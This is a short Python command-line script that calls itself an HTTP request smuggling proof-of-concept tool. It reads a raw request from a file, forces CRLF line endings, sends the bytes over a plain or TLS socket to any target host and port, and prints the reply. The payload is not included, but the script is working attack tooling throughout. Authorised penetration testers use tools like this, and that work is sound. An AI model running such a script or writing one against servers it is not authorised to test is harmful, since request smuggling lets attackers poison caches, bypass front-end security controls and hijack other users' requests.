import socket
import ssl
import argparse

def read_request_with_crlf(path):
    with open(path, 'r', encoding='utf-8') as f:
        lines = [(line.rstrip('\r\n') + '\r\n') for line in f]
    return ''.join(lines).encode('utf-8')

def send_smuggling_payload(host, port, use_ssl, req_bytes):
    try:
        with socket.create_connection((host, port), timeout=10) as sock:
            if use_ssl:
                context = ssl.create_default_context()
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    ssock.sendall(req_bytes)
                    return receive_response(ssock)
            else:
                sock.sendall(req_bytes)
                return receive_response(sock)
    except Exception as e:
        return f"[!] Connection or send failed: {e}"

def receive_response(sock):
    response = b''
    sock.settimeout(5)
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
    except socket.timeout:
        pass  # Done reading
    return response.decode(errors='replace')

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HTTP Request Smuggling PoC Tool")
    parser.add_argument("host", help="Target host (no http/https)")
    parser.add_argument("port", type=int, help="Target port (80 or 443)")
    parser.add_argument("request_file", help="File containing raw smuggling HTTP request")
    parser.add_argument("--ssl", action="store_true", help="Use SSL/TLS for HTTPS")

    args = parser.parse_args()
    req_bytes = read_request_with_crlf(args.request_file)
    print("[*] Sending smuggling payload...\n")
    response = send_smuggling_payload(args.host, args.port, args.ssl, req_bytes)
    print("[*] Response received:\n")
    print(response)
